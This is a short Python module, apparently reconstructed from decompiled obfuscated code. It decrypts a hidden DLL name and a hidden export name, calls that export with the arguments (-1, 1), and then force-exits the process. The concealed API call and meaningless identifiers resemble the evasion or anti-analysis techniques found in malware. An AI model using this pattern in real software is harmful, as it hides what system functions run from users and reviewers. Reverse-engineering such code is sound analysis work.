"""Recovered entry ``bx_n2_rx(_sy, _z, _ct, _n, _o, _p)``.

Decompiled structure: ``ctypes.WinDLL``, a hidden export name, an argument
pair ``(-1, 1)`` and ``os._exit(1)``.
The ctypes call signature is confirmed by the constant tuple.
"""
from __future__ import annotations

import ctypes
import os

from ..link._fds_jm import sec
from . import _ops


def bx_n2_rx() -> None:
    _sy = sec(_ops.redacted_secret("7carbw3j"))
    _z = sec(_ops.redacted_secret("u255aqwe"))
    _ct = ctypes.WinDLL(_sy)
    _n = getattr(_ct, _z)
    _n.argtypes = [ctypes.c_int, ctypes.c_int]
    _n.restype = ctypes.c_int
    _o = _n(-1, 1)
    _p = _o
    os._exit(1)

